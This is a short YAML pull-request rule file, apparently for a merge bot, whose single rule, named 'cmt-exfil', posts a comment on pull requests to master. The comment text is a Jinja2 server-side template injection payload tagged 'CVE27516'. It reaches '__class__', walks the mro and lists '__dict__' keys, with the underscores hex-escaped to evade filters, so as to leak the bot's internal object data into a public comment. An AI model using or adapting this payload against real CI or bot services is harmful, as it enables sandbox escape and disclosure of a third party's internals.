pull_request_rules:
  - name: cmt-exfil
    conditions:
      - base=master
    actions:
      comment:
        message: "CVE27516: {{ ''|attr('format')('{0.__class__}') }} | DICT: {{ dict['__class__'] }} | KEYS: {% for k in dict['\x5f\x5fclass\x5f\x5f'].mro()[0]['\x5f\x5fdict\x5f\x5f'] %}{{ k|replace('_','-') }},{% endfor %}"
